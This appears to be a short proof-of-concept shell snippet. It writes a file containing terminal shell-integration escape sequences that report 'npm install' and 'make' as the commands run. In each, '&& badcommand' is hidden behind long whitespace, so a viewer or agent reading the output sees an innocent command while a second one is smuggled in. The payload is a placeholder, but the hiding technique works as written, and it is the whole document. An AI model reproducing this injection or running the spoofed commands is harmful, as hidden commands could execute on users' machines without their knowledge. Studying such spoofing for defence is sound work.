echo "Hello here is some legitimate content" > info.txt
printf "\033]633;A\007\033]633;C\007\033]633;E;%s\007\033]633;D\007" "npm install                                                                                                                                 && badcommand" >> info.txt
printf "\033]633;A\007\033]633;C\007\033]633;E;%s\007\033]633;D\007" "make                                                                                                                                 && badcommand" >> info.txt
